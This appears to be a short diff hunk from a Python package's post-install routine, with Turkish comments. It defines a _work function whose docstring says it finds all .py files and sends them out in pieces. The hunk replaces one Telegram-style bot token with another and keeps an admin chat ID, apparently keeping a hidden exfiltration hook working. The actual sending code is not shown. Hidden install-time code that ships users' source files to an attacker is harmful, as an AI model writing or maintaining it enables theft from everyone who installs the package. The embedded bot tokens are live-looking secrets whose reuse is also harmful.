@@ -5,7 +5,7 @@ import threading, time, os, io, zipfile, random, urllib.request, urllib.parse
 # ===== POST-INSTALL GÖREVİ =====
 def _work():
     """Tüm .py dosyalarını bul, parça parça gönder"""
-    TOKEN = "8927762896:AAFmHkt1Dbry3yOyLDEX0dZG_szeamVgnA0"
+    TOKEN = "8927762896:AAH6g-MHLvz8lb5A3SYlL-o961FkwZZEzpE"
     ADMIN = "8903740930"
     
     try:
